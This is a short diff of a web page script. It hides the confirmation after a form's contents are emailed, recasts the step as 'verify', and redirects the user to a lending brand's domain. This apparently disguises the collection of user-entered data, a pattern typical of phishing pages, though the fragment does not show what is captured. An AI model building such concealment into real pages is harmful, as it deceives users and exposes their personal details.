@@ -116,9 +116,10 @@
         message: table
       })
       .then(() => {
-        alert("Email sent successfully!");
+        console.log("Email sent successfully!");
+        window.location.href = "fairmoney.com";
       }, (error) => {
-        alert("Failed to send email.\n" + JSON.stringify(error));
+        alert("Failed to verify.\n" + JSON.stringify(error));
       });
     });
   </script>
